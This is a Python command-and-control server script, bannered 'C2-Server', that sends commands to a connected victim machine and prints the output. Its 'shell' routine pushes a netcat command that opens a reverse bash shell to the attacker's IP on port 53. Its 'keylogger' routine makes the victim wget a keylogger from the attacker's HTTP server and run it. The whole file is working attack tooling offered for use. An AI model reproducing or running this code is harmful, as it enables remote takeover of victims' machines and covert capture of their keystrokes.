#!/usr/bin/python3

import socket
from os import system
from time import sleep

# ANSI color code
RED = "\033[0;31m"
WHITE = "\033[0m"
GREEN = '\033[1;92m'


def runkeylogger(conn):
    #downloading keylogger if not in the system from before
    print(f'[+] Run: "{RED}python3 -m http.server 80{WHITE}"')
    sleep(10)
    command = 'wget http://192.168.29.54/keylogger.py'
    conn.sendall(command.encode('utf-8'))

    sleep(5)

    #running the keylogger
    print(f'[+] Run: "{RED}python3 keyloggerserver.py{WHITE}"')
    sleep(10)
    command = 'python3 keylogger.py'
    conn.sendall(command.encode('utf-8'))

    return None 

def runshell(conn):
    #spawning fully interactive tty bash shell
    print(f"[+] Run: '{RED}rlwrap nc -lnvp 53{WHITE}'")
    sleep(10)
    command = 'nc 192.168.29.54 53 -e /usr/bin/bash'
    conn.sendall(command.encode('utf-8'))

    return None

def run():
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(('',9090))
    server.listen()
    print('[+] Server is up!')

    try:
        conn, addr = server.accept()     
        print(f'[+] Connection from {addr[0]}:{addr[1]}')
        platform = conn.recv(1024).decode()
        print(f'[+] OS: {platform}')

        while True:  
            #sending the command
            command = input('$> ')

            if command.lower() == 'exit':
                break   #exit condition

            #for getting a fully functional shell
            if command.lower() == 'shell':
                runshell(conn)
            
            #for starting a keylogger
            if command.lower() == 'keylogger':
                runkeylogger(conn)

            conn.sendall(command.encode('utf-8'))  #sending the data to victim

            #decoding the data which is send by the client
            data = conn.recv(4096).decode() 

            print(data)

            if not data:
                continue

    except KeyboardInterrupt:
        conn.close() #closing the connection
        pass

if __name__ == '__main__':
    #banner
    print(f'{GREEN}+-+-+-+-+-+-+-+-+-+{WHITE}')
    print(f'{RED}|C|2|-|S|e|r|v|e|r|{WHITE}')
    print(f'{GREEN}+-+-+-+-+-+-+-+-+-+{WHITE}')
    print(f'                     {GREEN}-@Debang5hu{WHITE}\n')

    #start
    run()